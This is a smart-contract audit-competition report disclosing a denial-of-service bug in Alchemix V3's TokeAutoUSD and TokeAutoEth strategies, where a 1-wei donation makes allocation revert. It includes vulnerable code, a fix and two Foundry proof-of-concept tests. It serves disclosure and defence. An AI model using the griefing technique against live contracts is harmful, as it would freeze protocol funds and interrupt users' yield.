# 56522 sc medium tokeautousdstrategy allocate and tokeautoethstrategy allocate may suffer a denial of service dos due to token amount mismatch in autopilotrouter depositmax&#x20;

**Submitted on Oct 17th 2025 at 08:22:19 UTC by @joicygiore for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56522
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoUSDStrategy.sol>
* **Impacts:**
  * Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

An attacker can send a minimal amount of tokens (e.g., `1 wei`) to the `TokeAutoUSDStrategy` or `TokeAutoEthStrategy` contract, which causes the subsequent `_allocate()` call to revert, resulting in a persistent DoS of the strategy allocation process.

## Vulnerability Details

The `AutopilotRouter::depositMax()` function calculates the deposit amount as the minimum of the caller’s balance and the vault’s `maxDeposit()` limit, as shown below:

```js
    /// @inheritdoc IAutopilotRouter
    function depositMax(
        IAutopool vault,
        address to,
        uint256 minSharesOut
    ) public payable override returns (uint256 sharesOut) {
        IERC20 asset = IERC20(vault.asset());
        
@>1        uint256 assetBalance = asset.balanceOf(msg.sender);
@>2        uint256 maxDeposit = vault.maxDeposit(to);
@>3        uint256 amount = maxDeposit < assetBalance ? maxDeposit : assetBalance;
@>4        pullToken(asset, amount, address(this));

        approve(IERC20(vault.asset()), address(vault), amount);
        return deposit(vault, to, amount, minSharesOut);
    }
```

The function `PeripheryPayments::pullToken()` transfers the token from msg.sender to the router:

```js
    // PeripheryPayments::pullToken()
    function pullToken(IERC20 token, uint256 amount, address recipient) public payable {
        token.safeTransferFrom(msg.sender, recipient, amount);
    }
```

However, in the strategy implementation (`TokeAutoUSDStrategy::_allocate()` and `TokeAutoEthStrategy::_allocate()`), the strategy only grants approval equal to the `amount` parameter, while the router attempts to pull the full token balance of the contract.

```js
    function _allocate(uint256 amount) internal override returns (uint256) {
        require(TokenUtils.safeBalanceOf(address(usdc), address(this)) >= amount, "Strategy balance is less than amount");
        TokenUtils.safeApprove(address(usdc), address(router), amount);
        uint256 shares = router.depositMax(autoUSD, address(this), 0);
        TokenUtils.safeApprove(address(autoUSD), address(rewarder), shares);
        rewarder.stake(address(this), shares);
        return amount;
    }
```

If a malicious user transfers even `1 wei` of the same token to the strategy contract, the router’s `pullToken()` call will attempt to transfer the total balance (which is slightly larger than the approved amount), causing the call to revert and halting the `_allocate()` execution.

## Impact Details

1. Denial of Service (DoS):
   * The strategy’s `_allocate()` function becomes non-functional. As it reverts on every call, the protocol cannot deposit or reallocate funds to the target vaults, effectively halting yield generation.
2. Yield Interruption:
   * Since no new funds can be deposited, the strategy cannot earn yield or rewards from the target Autopools. This causes prolonged yield interruption for all users whose deposits are managed by this strategy.
3. Operational Impact:
   * The issue can persist indefinitely until the stray `1 wei` token is manually removed.
   * Automated rebalancing or reallocation scripts may fail continuously.
   * Potentially affects the system’s composability if other strategies or contracts depend on successful allocation.
4. User Funds:
   * User funds are not directly stolen or lost, but they remain temporarily frozen within the strategy contract until manual intervention.

## References

[TokeAutoUSDStrategy::\_allocate()](https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/strategies/mainnet/TokeAutoUSDStrategy.sol#L42-L49) [TokeAutoEthStrategy::\_allocate()](https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/strategies/mainnet/TokeAutoEth.sol#L56-L63) [AutopilotRouter::depositMax()](https://github.com/Tokemak/v2-core-pub/blob/de163d5a1edf99281d7d000783b4dc8ade03591e/src/vault/AutopilotRouter.sol#L91-L104) [AutopilotRouter::depositMax()](https://github.com/Tokemak/v2-core-pub/blob/de163d5a1edf99281d7d000783b4dc8ade03591e/src/vault/AutopilotRouter.sol)

## Recommendation

To mitigate this issue, the strategy can replace the use of `AutopilotRouter::depositMax()` with `AutopilotRouter::depositBalance()`.

Unlike `depositMax()`, which attempts to pull tokens from `msg.sender` and may revert if the approved amount is smaller than the actual balance, `depositBalance()` directly deposits the contract’s internal balance into the vault.

This approach ensures:

* the function operates atomically using only internal state,
* no external safeTransferFrom() call is made,
* and any extra dust tokens in the contract do not cause revert conditions.

Hence, using `depositBalance()` eliminates the DoS vector entirely and provides a more robust and flexible deposit mechanism.

## Proof of Concept

## Proof of Concept

Add the following test to `src/test/strategies/TokeAutoUSDStrategy.t.sol` and run it:

```js
    function test_poc_TokeAutoUSDStrategy_allocate() public {
        vm.stopPrank();

        // init maliciousUser
        address maliciousUser = makeAddr("maliciousUser");
        deal(testConfig.vaultAsset, maliciousUser, 1);
        uint256 amountToAllocate = 1 * 10 ** testConfig.decimals;
        deal(testConfig.vaultAsset, strategy, amountToAllocate);
        bytes memory prevAllocationAmount = abi.encode(0);
        
        // maliciousUser transfer 1 wei to strategy
        vm.prank(maliciousUser);
        (bool success,) = testConfig.vaultAsset.call(
        abi.encodeWithSignature("transfer(address,uint256)", address(strategy), 1));
        require(success);

        // check balance
        assertEq(IERC20(testConfig.vaultAsset).balanceOf(address(strategy)), amountToAllocate + 1);


        vm.startPrank(vault);
        // Allowance amount less than balance causes call revert ❌
        vm.expectRevert();
        IMYTStrategy(strategy).allocate(prevAllocationAmount, amountToAllocate, "", address(vault));
        uint256 initialRealAssets = IMYTStrategy(strategy).realAssets();
        require(initialRealAssets == 0, "Initial real assets isn't 0");
        vm.stopPrank();
    }
```

Add the following test to `src/test/strategies/TokeAutoETHStrategy.t.sol` and run it:

```js
    function test_poc_TokeAutoEthStrategy_allocate() public {
        vm.stopPrank();

        // init maliciousUser
        address maliciousUser = makeAddr("maliciousUser");
        deal(testConfig.vaultAsset, maliciousUser, 1);
        uint256 amountToAllocate = 1 * 10 ** testConfig.decimals;
        deal(testConfig.vaultAsset, strategy, amountToAllocate);
        bytes memory prevAllocationAmount = abi.encode(0);
        
        // maliciousUser transfer 1 wei to strategy
        vm.prank(maliciousUser);
        (bool success,) = testConfig.vaultAsset.call(
        abi.encodeWithSignature("transfer(address,uint256)", address(strategy), 1));
        require(success);

        // check balance
        assertEq(IERC20(testConfig.vaultAsset).balanceOf(address(strategy)), amountToAllocate + 1);


        vm.startPrank(vault);
        // Allowance amount less than balance causes call revert ❌
        vm.expectRevert();
        IMYTStrategy(strategy).allocate(prevAllocationAmount, amountToAllocate, "", address(vault));
        uint256 initialRealAssets = IMYTStrategy(strategy).realAssets();
        require(initialRealAssets == 0, "Initial real assets isn't 0");
        vm.stopPrank();
    }
```
